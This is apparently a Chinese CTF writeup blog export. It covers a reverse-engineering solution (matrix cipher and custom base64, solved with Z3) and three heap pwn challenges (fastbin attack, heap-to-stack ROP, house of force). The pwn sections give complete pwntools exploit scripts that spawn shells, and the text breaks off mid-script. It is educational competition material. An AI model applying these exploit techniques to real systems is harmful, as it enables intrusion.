<p>丢入IDA中分析，两个关键的函数<strong>fencode</strong>和<strong>encode</strong>，可以明显看出是我们输入的字符串经过两层加密后与 “lUFBuT7hADvItXEGn7KgTEjqw8U5VQUq” 进行比较，相同即为正确flag.</p>
<p>在fencode函数的代码中，采用了很多while进行混淆，其实关键的地方也就三处</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.if ( len != 24 ) //这里判断了字符串总长度为24</span><br><span class="line"></span><br><span class="line">2.sum += *(&amp;str[4 * v11] + v8) * *(&amp;m[4 * v10] + v8) //这里v11&lt;6 v10&lt;4 v8&lt;4</span><br><span class="line">输入的str字符串与m字符串相乘后求和，是个4x4矩阵乘法</span><br><span class="line"></span><br><span class="line">3.v6 = i++; str_out[v6] = sum % 127; //这里输出str0 % 127运算后的字符串</span><br></pre></td></tr></table></figure>

<p>静态分析的话，沿着控制流分析一波整个流程类似于以下C代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(v11=0; v11&lt;6; v11++)</span><br><span class="line">&#123;</span><br><span class="line">  for(v10=0; v10&lt;4; v10++)</span><br><span class="line">  &#123;</span><br><span class="line">    sum = 0;</span><br><span class="line">    for(v8=0; v8&lt;4; v8++)</span><br><span class="line">    &#123;</span><br><span class="line">      sum += str[4 * v11 + v8] * m[4 * v10 + v8];</span><br><span class="line">    &#125;</span><br><span class="line">    str_out[i++] = sum % 127;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>嵌套循环运算后输出str_out字符串，在encode中对str_out再次加密，找到算法特征处：<img src="https://s1.ax1x.com/2018/05/28/C4BfMD.jpg" alt="C4BfMD.jpg"></p>
<p>从这里可以看出这是一个的base64的算法，不过编码表被改为了：<br>“FeVYKw6a0lDIOsnZQ5EAf2MvjS1GUiLWPTtH4JqRgu3dbC8hrcNo9/mxzpXBky7+”<br>base64加密后的字符串与”lUFBuT7hADvItXEGn7KgTEjqw8U5VQUq” 比较</p>
<p>那么思路已经很明显了，第一层加密同样用Z3求解器解方程组(爆破也可以，但等的太久太久了)，第二层加密在网上找个脚本改下编码表然后解码</p>
<p>先上base64解密脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from numpy import *</span><br><span class="line">import numpy as np</span><br><span class="line">import base64</span><br><span class="line">import string</span><br><span class="line">import chardet</span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line">base64_charset = &apos;FeVYKw6a0lDIOsnZQ5EAf2MvjS1GUiLWPTtH4JqRgu3dbC8hrcNo9/mxzpXBky7+&apos;</span><br><span class="line"></span><br><span class="line">letters = list(base64_charset)</span><br><span class="line"></span><br><span class="line">def encode(input_str):</span><br><span class="line">    # 对每一个字节取ascii数值或unicode数值，然后转换为2进制</span><br><span class="line">    str_ascii_list = [&apos;&#123;:0&gt;8&#125;&apos;.format(str(bin(ord(i))).replace(&apos;0b&apos;, &apos;&apos;))</span><br><span class="line">                      for i in input_str]</span><br><span class="line">    output_str = &apos;&apos;</span><br><span class="line">    # 不够3的整数倍 补齐所需要的次数</span><br><span class="line">    equal_num = 0</span><br><span class="line">    while str_ascii_list:</span><br><span class="line">        temp_list = str_ascii_list[:3]</span><br><span class="line">        if len(temp_list) != 3:</span><br><span class="line">            while len(temp_list) &lt; 3:</span><br><span class="line">                equal_num += 1</span><br><span class="line">                temp_list += [&apos;0&apos;*8]</span><br><span class="line">        temp_str = &apos;&apos;.join(temp_list)</span><br><span class="line">        # 三个8字节的二进制 转换为4个6字节的二进制</span><br><span class="line">        temp_str_list = [temp_str[x:x+6] for x in [0, 6, 12, 18]]</span><br><span class="line">        # 二进制转为10进制</span><br><span class="line">        temp_str_list = [int(x, 2) for x in temp_str_list]</span><br><span class="line">        # 判断是否为补齐的字符 做相应的处理</span><br><span class="line">        if equal_num:</span><br><span class="line">            temp_str_list = temp_str_list[0:4-equal_num]</span><br><span class="line">        output_str += &apos;&apos;.join([letters[x] for x in temp_str_list])</span><br><span class="line">        str_ascii_list = str_ascii_list[3:]</span><br><span class="line">    output_str = output_str + &apos;=&apos; * equal_num</span><br><span class="line">    #print(output_str)</span><br><span class="line">    return output_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def decode(input_str):</span><br><span class="line">    # 对每一个字节取索引，然后转换为2进制</span><br><span class="line">    str_ascii_list = [&apos;&#123;:0&gt;6&#125;&apos;.format(str(bin(letters.index(i))).replace(&apos;0b&apos;, &apos;&apos;))</span><br><span class="line">                      for i in input_str if i != &apos;=&apos;]</span><br><span class="line">    output_str = &apos;&apos;</span><br><span class="line">    equal_num = input_str.count(&apos;=&apos;)</span><br><span class="line">    while str_ascii_list:</span><br><span class="line">        temp_list = str_ascii_list[:4]</span><br><span class="line">        temp_str = &apos;&apos;.join(temp_list)</span><br><span class="line">        # 补够8位</span><br><span class="line">        if len(temp_str) % 8 != 0:</span><br><span class="line">            temp_str = temp_str[0:-1*equal_num*2]</span><br><span class="line">        # 4个6字节的二进制  转换  为三个8字节的二进制 </span><br><span class="line">        temp_str_list = [temp_str[x:x+8] for x in [0, 8, 16]]</span><br><span class="line">        # 二进制转为10进制</span><br><span class="line">        temp_str_list = [int(x, 2) for x in temp_str_list if x]</span><br><span class="line">        output_str += &apos;&apos;.join([chr(x) for x in temp_str_list])</span><br><span class="line">        str_ascii_list = str_ascii_list[4:]</span><br><span class="line">    #print(output_str)</span><br><span class="line">    return output_str</span><br><span class="line"></span><br><span class="line">str0 = decode(&quot;lUFBuT7hADvItXEGn7KgTEjqw8U5VQUq&quot;)</span><br><span class="line">int = [0]*24</span><br><span class="line">for i in range(24):</span><br><span class="line">  int[i] = ord(str0[i])</span><br><span class="line">print int</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from z3 import*</span><br><span class="line"></span><br><span class="line">key = [37, 192, 59, 166, 31, 175, 76, 165, 203, 139, 164, 155, 59, 225, 40, 133, 38, 38, 22, 231, 17, 9, 7, 38]</span><br><span class="line">m =[2, 2, 4, 4294967291, 1, 1, 3, 4294967293, 4294967295, 4294967294, 4294967293, 4, 4294967295, 0, 4294967294, 2]</span><br><span class="line"></span><br><span class="line">f1 = lambda x1, x2, x3, x4: (x1 * m[0] + x2 * m[1] + x3 * m[2] + x4 * m[3]) &amp; 0xff</span><br><span class="line">f2 = lambda x1, x2, x3, x4: (x1 * m[4] + x2 * m[5] + x3 * m[6] + x4 * m[7]) &amp; 0xff</span><br><span class="line">f3 = lambda x1, x2, x3, x4: (x1 * m[8] + x2 * m[9] + x3 * m[10] + x4 * m[11]) &amp; 0xff</span><br><span class="line">f4 = lambda x1, x2, x3, x4: (x1 * m[12] + x2 * m[13] + x3 * m[14] + x4 * m[15]) &amp; 0xff</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">flag = [BitVec(str(i), 16) for i in  range(24)]</span><br><span class="line"></span><br><span class="line">for i in xrange(6):</span><br><span class="line">    s.add(f1(flag[4 * i + 0], flag[4 * i + 1], flag[4 * i + 2], flag[4 * i + 3]) == key[i * 4 + 0])</span><br><span class="line">    s.add(f2(flag[4 * i + 0], flag[4 * i + 1], flag[4 * i + 2], flag[4 * i + 3]) == key[i * 4 + 1])</span><br><span class="line">    s.add(f3(flag[4 * i + 0], flag[4 * i + 1], flag[4 * i + 2], flag[4 * i + 3]) == key[i * 4 + 2])</span><br><span class="line">    s.add(f4(flag[4 * i + 0], flag[4 * i + 1], flag[4 * i + 2], flag[4 * i + 3]) == key[i * 4 + 3])</span><br><span class="line"></span><br><span class="line">for i in xrange(24):</span><br><span class="line">    s.add(flag[i]&gt;=32)</span><br><span class="line">    s.add(flag[i]&lt;=127)</span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">answer=s.model()</span><br><span class="line">res = &quot;&quot;</span><br><span class="line">for i in range(24):</span><br><span class="line">  res += chr(answer.eval(flag[i]).as_long())</span><br><span class="line">print repr(res)</span><br></pre></td></tr></table></figure>

<p><a href><a href="https://pan.baidu.com/s/1_acOeyZZUsiJlVneeKI9kw" target="_blank" rel="noopener">题目打包下载</a></a></p>
<p>密码：d1bm</p>
]]></content>
      <tags>
        <tag>re</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>2018铁三总决个人赛writeup</title>
    <url>/2019/01/20/2018%E9%93%81%E4%B8%89%E6%80%BB%E5%86%B3%E4%B8%AA%E4%BA%BA%E8%B5%9Bwriteup/</url>
    <content><![CDATA[<p>上个月去北京参加了铁三总决赛，自己负责pwn，也是第二次在比赛里做pwn，三道pwn比赛时只做出来一道(littlenote)，也是很菜了。北航的师傅们一上午就AK了，赛后寻找到writeup，学习了一番，在此做下记录。</p>
<h5 id="一、littlenote-fastbin-attack"><a href="#一、littlenote-fastbin-attack" class="headerlink" title="一、littlenote(fastbin attack)"></a>一、littlenote(fastbin attack)</h5><p>本题保护全开，got表不可写，pie开启</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>漏洞点在于free的时候没有将指针置0，存在悬挂指针，可以联想到UAF</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned __int64 freenote()</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;Which note do you want to delete?&quot;);</span><br><span class="line">  _isoc99_scanf(&quot;%u&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt; (unsigned __int64)notenum )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( note[v1] )</span><br><span class="line">      free(note[v1]);</span><br><span class="line">    puts(&quot;Done&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用思路如下：</p>
<ol>
<li><p>泄露heap地址：由于fastbins 的特性，我们连续 free 两个chunk，这个时候会产生一个 fastbins 的freelist</p>
</li>
<li><p>泄露libc地址：fake 一个chunk，让它分配到 unsortedbin 中，我们知道当一个chunk 在 unsortedbin中的时候，它的fd会指向 main_arena</p>
</li>
<li><p>fastbin attack：在malloc_hook上面找到合适的size，在指定位置申请chunk以实现修改malloc_hook内容为onegadget</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">DEBUG = 1</span><br><span class="line">if DEBUG:</span><br><span class="line">    p = process(&apos;./littlenote&apos;)</span><br><span class="line">    #p = process(&quot;./littlenote&quot;, env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc_64.so&quot;&#125;)</span><br><span class="line">    #libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">    #context.log_level = &apos;debug&apos;</span><br><span class="line">    libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">    p = remote(&apos;202.120.7.218&apos;, 12321)</span><br><span class="line"></span><br><span class="line">def add_note(note,y_n=&apos;Y&apos;):</span><br><span class="line">  p.recvuntil(&apos;choice:\n&apos;)</span><br><span class="line">  p.send(&apos;1\n&apos;)</span><br><span class="line">  p.recvuntil(&apos;note\n&apos;)</span><br><span class="line">  p.send(note)</span><br><span class="line">  p.recvuntil(&apos;note?\n&apos;)</span><br><span class="line">  p.send(y_n+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">def show_note(index):</span><br><span class="line">  p.recvuntil(&apos;choice:\n&apos;)</span><br><span class="line">  p.send(&apos;2\n&apos;)</span><br><span class="line">  p.recvuntil(&apos;show?\n&apos;)</span><br><span class="line">  p.send(str(index)+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line">def delete_note(index):</span><br><span class="line">  p.recvuntil(&apos;choice:\n&apos;)</span><br><span class="line">  p.send(&apos;3\n&apos;)</span><br><span class="line">  p.recvuntil(&apos;delete?\n&apos;)</span><br><span class="line">  p.send(str(index)+&apos;\n&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#1.leak heap_base</span><br><span class="line">add_note(&apos;0\n&apos;)  #0</span><br><span class="line">add_note(&apos;1\n&apos;)  #1</span><br><span class="line">add_note(&apos;2\n&apos;)  #2</span><br><span class="line">add_note(&apos;3\n&apos;)  #3</span><br><span class="line">add_note(&apos;4\n&apos;)  #4</span><br><span class="line">add_note(&apos;5\n&apos;)  #5</span><br><span class="line">delete_note(1)</span><br><span class="line">delete_note(2)</span><br><span class="line">show_note(2)</span><br><span class="line">data=p.recv(6)+&apos;\x00\x00&apos;</span><br><span class="line">data=u64(data)</span><br><span class="line">print data</span><br><span class="line">heap_base=data-0x70</span><br><span class="line">print &apos;heap_base=&apos;,hex(heap_base)</span><br><span class="line">#2.leak libc_base</span><br><span class="line">delete_note(1)</span><br><span class="line"></span><br><span class="line">payload=p64(heap_base+0xd0)+p64(0)</span><br><span class="line">payload+=&apos;\x00&apos;*0x40</span><br><span class="line">payload+=p64(0)+p64(0x71)</span><br><span class="line">#payload+=p64(0)+p64(0)</span><br><span class="line">add_note(payload)  #5    1</span><br><span class="line"></span><br><span class="line">add_note(&apos;6\n&apos;)  #6      2</span><br><span class="line">add_note(&apos;7\n&apos;)  #7      1</span><br><span class="line"></span><br><span class="line">#payload2=p64(0)+p64(0)</span><br><span class="line">payload2=p64(0)+p64(0xe1)</span><br><span class="line">#payload2+=&apos;\n&apos;</span><br><span class="line"></span><br><span class="line">add_note(payload2)  #8</span><br><span class="line"></span><br><span class="line">delete_note(2)</span><br><span class="line">#debug(0xD0A)</span><br><span class="line">show_note(2)</span><br><span class="line">data=p.recv(6)+&apos;\x00\x00&apos;</span><br><span class="line">data=u64(data)</span><br><span class="line">#libc_base=data-(0x00007f1eaa794b78-0x7f1eaa3d0000)#(0x7f222fbd2b78-0x7f222f80e000)</span><br><span class="line">libc_base = data-88-(libc.symbols[&apos;__malloc_hook&apos;]+0x10)</span><br><span class="line">print &apos;libc_base=&apos;,hex(libc_base)</span><br><span class="line">one_gadget=libc_base+0xf0274    #  0xf02a4           0x4526a   0xf0274   0xf1117</span><br><span class="line">malloc_hook=libc_base+libc.symbols[&apos;__malloc_hook&apos;]</span><br><span class="line"></span><br><span class="line">print &apos;malloc_hook=&apos;,hex(malloc_hook)</span><br><span class="line">print &apos;one_gadget=&apos;,hex(one_gadget)</span><br><span class="line"></span><br><span class="line">#3.fastbin attack</span><br><span class="line">#add_note(&apos;9\n&apos;)  #9</span><br><span class="line">#add_note(&apos;10\n&apos;)  #10</span><br><span class="line">delete_note(0)</span><br><span class="line">delete_note(1)</span><br><span class="line">delete_note(0)</span><br><span class="line"></span><br><span class="line">add_note(p64(malloc_hook-0x20-3)+&apos;\n&apos;)  #9    0</span><br><span class="line"></span><br><span class="line">add_note(&apos;10\n&apos;)  #10    1</span><br><span class="line">add_note(&apos;11\n&apos;)  #11    0</span><br><span class="line">add_note(&apos;\x00&apos;*0x13+p64(one_gadget)+&apos;\n&apos;)  #12    0</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;choice:\n&apos;)</span><br><span class="line">p.send(&apos;1\n&apos;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="二、bookstore-堆漏洞转化为栈漏洞"><a href="#二、bookstore-堆漏洞转化为栈漏洞" class="headerlink" title="二、bookstore(堆漏洞转化为栈漏洞)"></a>二、bookstore(堆漏洞转化为栈漏洞)</h5><p>本题开启NX，got表同样不可写</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>漏洞点在输入书本名字的时候，readn函数中，先将size-1，那如果输入为0，就可以进行堆溢出了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall readn(__int64 a1, int size)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  unsigned int v3; // eax</span><br><span class="line">  unsigned __int8 buf; // [rsp+1Bh] [rbp-5h]</span><br><span class="line">  unsigned int v5; // [rsp+1Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  v5 = 0;</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (unsigned int)(size - 1);</span><br><span class="line">    if ( (unsigned int)result &lt;= v5 )</span><br><span class="line">      break;</span><br><span class="line">    read(0, &amp;buf, 1uLL);</span><br><span class="line">    result = buf;</span><br><span class="line">    if ( buf == 10 )</span><br><span class="line">      break;</span><br><span class="line">    v3 = v5++;</span><br><span class="line">    *(_BYTE *)(a1 + v3) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用思路如下：</p>
<ol>
<li><p>堆溢出：构造一个smallbin大小的size，free进unsortbin中泄露libc</p>
</li>
<li><p>泄露了栈地址：通过fastbin attack在bss段的books申请chunk，覆盖book name指针，泄露environ里面存的值</p>
</li>
<li><p>在add book的时候发现一个0x40的fake fastbin size，所以后面直接利用fastbin attack在栈上申请chunk，覆盖返回地址即可，onegadget在这里行不通，索性直接pop rdi ret；system，成功getshell</p>
</li>
</ol>
<p>这里的exp来自giantbranch大佬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Date    : 2018-12-08 19:39:57</span><br><span class="line"># @Author  : giantbranch (giantbranch@gmail.com)</span><br><span class="line"># @Link    : http://www.giantbranch.cn/</span><br><span class="line"># @tags : </span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"># context.log_level = &quot;debug&quot;</span><br><span class="line">p = process(&quot;./bookstore&quot;)</span><br><span class="line"></span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line">environ_offset = libc.symbols[&apos;environ&apos;]</span><br><span class="line"></span><br><span class="line">book_addr = 0x602060</span><br><span class="line"></span><br><span class="line"># local libc</span><br><span class="line"># environ_offset = 0x3c6f38</span><br><span class="line">main_arena_offset = 0x3c4b20</span><br><span class="line"># one_gadget_offset = 0xf02a4</span><br><span class="line">one_gadget_offset = 0xf1147</span><br><span class="line"></span><br><span class="line"># 0x0000000000400cd3 : pop rdi ; ret</span><br><span class="line">pop_rdi_ret = 0x0000000000400cd3</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add_book(author, size, bookname):</span><br><span class="line">	p.recvuntil(&quot;Your choice:\n&quot;)</span><br><span class="line">	p.sendline(&quot;1&quot;)</span><br><span class="line">	p.recvuntil(&quot;What is the author name?\n&quot;)</span><br><span class="line">	p.sendline(author)</span><br><span class="line">	p.recvuntil(&quot;How long is the book name?\n&quot;)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(&quot;What is the name of the book?\n&quot;)</span><br><span class="line">	p.sendline(bookname)</span><br><span class="line"></span><br><span class="line">def sellbook(index, ):</span><br><span class="line">	p.recvuntil(&quot;Your choice:\n&quot;)</span><br><span class="line">	p.sendline(&quot;2&quot;)</span><br><span class="line">	p.recvuntil(&quot;Which book do you want to sell?\n&quot;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def readbook(index):</span><br><span class="line">	p.recvuntil(&quot;Your choice:\n&quot;)</span><br><span class="line">	p.sendline(&quot;3&quot;)</span><br><span class="line">	p.recvuntil(&quot;Which book do you want to sell?\n&quot;)</span><br><span class="line">	p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getpid():</span><br><span class="line">	print proc.pidof(p)[0]</span><br><span class="line">	pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_book(p64(0) + p64(0x21) , 0, &quot;a&quot; * 8)</span><br><span class="line">add_book(&quot;B&quot;, 0, &quot;b&quot; * 8)</span><br><span class="line">add_book(&quot;C&quot;, 0, &quot;c&quot; * 8)</span><br><span class="line">add_book(&quot;D&quot;, 0x50, &quot;d&quot; * 8)</span><br><span class="line">add_book(&quot;e&quot;, 0x50, p64(0) + p64(0x51))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># overflow B to C and leak libc</span><br><span class="line">sellbook(1)</span><br><span class="line">add_book(&quot;a&quot;, 0, p64(0) * 3 + p64(0x91))</span><br><span class="line">sellbook(2)</span><br><span class="line">add_book(&quot;b&quot;, 0, &quot;a&quot; * 8)</span><br><span class="line">readbook(2)</span><br><span class="line">p.recvuntil(&quot;a&quot; * 8)</span><br><span class="line">main_arena_near = u64(p.recvuntil(&quot;\n&quot;)[:-1].ljust(8, &quot;\x00&quot;))</span><br><span class="line">print &quot;main_arena_near = &quot; + hex(main_arena_near)</span><br><span class="line">main_arena_addr = main_arena_near - 0xd8</span><br><span class="line">print &quot;main_arena_addr = &quot; + hex(main_arena_addr)</span><br><span class="line">libc_addr = main_arena_addr - main_arena_offset</span><br><span class="line">print &quot;libc_addr = &quot; + hex(libc_addr)</span><br><span class="line">one_gadget_addr = libc_addr + one_gadget_offset</span><br><span class="line">print &quot;one_gadget_addr = &quot; + hex(one_gadget_addr)</span><br><span class="line">environ_addr = libc_addr + environ_offset</span><br><span class="line">print &quot;environ_addr = &quot; + hex(environ_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 计算system和/bin/sh的地址</span><br><span class="line">print &quot;\ncalculating system() addr and \&quot;/bin/sh\&quot; addr ... ###&quot;</span><br><span class="line">system_addr = libc_addr + libc.symbols[&apos;system&apos;]</span><br><span class="line">print &quot;system_addr = &quot; + hex(system_addr)</span><br><span class="line">binsh_addr = libc_addr +  next(libc.search(&quot;/bin/sh&quot;))</span><br><span class="line">print &quot;binsh_addr = &quot; + hex(binsh_addr)</span><br><span class="line"># getpid()</span><br><span class="line"># 泄露environ中的值</span><br><span class="line">sellbook(2)</span><br><span class="line">sellbook(1)</span><br><span class="line">add_book(&quot;a&quot;, 0, p64(0) * 3 + p64(0x21) + p64(book_addr))</span><br><span class="line">add_book(&quot;a&quot;, 0, p64(0))</span><br><span class="line">## 覆盖bookname指针</span><br><span class="line">add_book(&quot;a&quot;, 0, p64(0) * 2 + p64(environ_addr))</span><br><span class="line">readbook(0)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Bookname:&quot;)</span><br><span class="line">stack_addr = u64(p.recvuntil(&quot;\n&quot;)[:-1].ljust(8, &quot;\x00&quot;))</span><br><span class="line">print &quot;stack_addr = &quot; + hex(stack_addr)</span><br><span class="line"></span><br><span class="line">stack_offset_40 = stack_addr - 310</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># getpid()</span><br><span class="line"></span><br><span class="line">add_book(&quot;a&quot;, 0x50, &quot;test&quot;)</span><br><span class="line"></span><br><span class="line">add_book(&quot;a&quot;, 0, &quot;test1&quot;)</span><br><span class="line">add_book(&quot;a&quot;, 0, &quot;test2&quot;)</span><br><span class="line">add_book(&quot;a&quot;, 0, &quot;test3&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sellbook(7)</span><br><span class="line">add_book(&quot;a&quot;, 0, p64(0) * 3 + p64(0x41) + p64(stack_offset_40))</span><br><span class="line">sellbook(8)</span><br><span class="line">sellbook(7)</span><br><span class="line">add_book(&quot;a&quot;, 0, p64(0) * 3 + p64(0x41) + p64(stack_offset_40))</span><br><span class="line"></span><br><span class="line">add_book(&quot;a&quot;, 0x30, &quot;1&quot;)</span><br><span class="line">print &quot;stack_addr = &quot; + hex(stack_addr)</span><br><span class="line">print &quot;stack_offset_40 = &quot; + hex(stack_offset_40)</span><br><span class="line"># getpid()</span><br><span class="line"># 写返回地址为rop</span><br><span class="line"># payload = &quot;a&quot; * 22 + p64(one_gadget_addr)</span><br><span class="line">payload = &quot;a&quot; * 22 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">add_book(&quot;a&quot;, 0x30, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h5 id="三、myhouse-house-of-force"><a href="#三、myhouse-house-of-force" class="headerlink" title="三、myhouse(house of force)"></a>三、myhouse(house of force)</h5><p>这道题的got可写，开启NX，PIE没开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>漏洞点在add_house函数中，v3和size的大小可以不同，通过控制v3，可以实现任意地址写NULL</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">unsigned __int64 add_house()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  size_t size; // [rsp+0h] [rbp-30h]</span><br><span class="line">  __int64 v3; // [rsp+8h] [rbp-28h]</span><br><span class="line">  char s; // [rsp+10h] [rbp-20h]</span><br><span class="line">  unsigned __int64 v5; // [rsp+28h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  memset(&amp;s, 0, 0x10uLL);</span><br><span class="line">  myputs(&quot;What&apos;s your name?&quot;);</span><br><span class="line">  read(0, &amp;owner, 0x20uLL);</span><br><span class="line">  myputs(&quot;What is the name of your house?&quot;);</span><br><span class="line">  housen = malloc(0x100uLL);</span><br><span class="line">  read(0, housen, 0x100uLL);</span><br><span class="line">  myputs(&quot;What is the size of your house?&quot;);</span><br><span class="line">  read(0, &amp;s, 0xFuLL);</span><br><span class="line">  v0 = atoi(&amp;s);</span><br><span class="line">  v3 = v0;</span><br><span class="line">  size = v0;</span><br><span class="line">  if ( (unsigned __int64)v0 &gt; 0x300000 )</span><br><span class="line">  &#123;</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      myputs(&quot;Too large!&quot;);</span><br><span class="line">      read(0, &amp;s, 0xFuLL);</span><br><span class="line">      size = atoi(&amp;s);</span><br><span class="line">    &#125;</span><br><span class="line">    while ( size &gt; 0x300000 );</span><br><span class="line">  &#125;</span><br><span class="line">  housed = malloc(size);</span><br><span class="line">  myputs(&quot;Give me its description:&quot;);</span><br><span class="line">  read(0, housed, size - 1);</span><br><span class="line">  *((_BYTE *)housed + v3 - 1) = 0;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用思路如下：</p>
<ol>
<li><p>通过申请大于等于0x200000的内存，那边会用mmap分配，而这个mmap分配的内存跟libc的偏移是固定的</p>
</li>
<li><p>通过控制v3，将null写到top chunk指针的最低位，top chunk指针就指向了house name的最后的16字节的位置（堆地址可以通过owner泄露）</p>
</li>
<li><p>当然在这之前得控制house name的最后一个8字节为8个\xff,这是为house of force做的铺垫</p>
</li>
<li><p>然后我们就可以利用house of force，申请特定的大小的 chunk到house_description_addr</p>
</li>
<li><p>将house_description覆盖为got就可以泄露libc并同时覆盖room，那就可以覆盖atoi的got来getshell了</p>
</li>
</ol>
<p>这里的exp也来自giantbranch大佬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Date    : 2018-12-11 21:43:54</span><br><span class="line"># @Author  : giantbranch (giantbranch@gmail.com)</span><br><span class="line"># @Link    : http://www.giantbranch.cn/</span><br><span class="line"># @tags : </span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = process(&quot;./myhouse&quot;)</span><br><span class="line">libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def init(mmap_topchunkpoint_offset):</span><br><span class="line">	p.recvuntil(&quot;What&apos;s your name?\n&quot;)</span><br><span class="line">	p.send(&quot;1&quot; * 0x20)</span><br><span class="line">	p.recvuntil(&quot;What is the name of your house?\n&quot;)</span><br><span class="line">	p.send(&quot;\x00&quot; * (0x100 - 8) + &quot;\xff&quot; * 8)</span><br><span class="line">	p.recvuntil(&quot;What is the size of your house?\n&quot;)</span><br><span class="line">	p.sendline(str(mmap_topchunkpoint_offset))</span><br><span class="line">	p.recvuntil(&quot;Too large!\n&quot;)</span><br><span class="line">	# use mmap and use null byte write bug to write top chunk point</span><br><span class="line">	p.sendline(str(0x200000))</span><br><span class="line">	p.recvuntil(&quot;Give me its description:\n&quot;)</span><br><span class="line">	p.send(&quot;not use&quot;)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">def build_room(size):</span><br><span class="line">	p.recvuntil(&quot;Your choice:\n&quot;)</span><br><span class="line">	p.sendline(&quot;1&quot;)</span><br><span class="line">	p.recvuntil(&quot;What is the size of your room?\n&quot;)</span><br><span 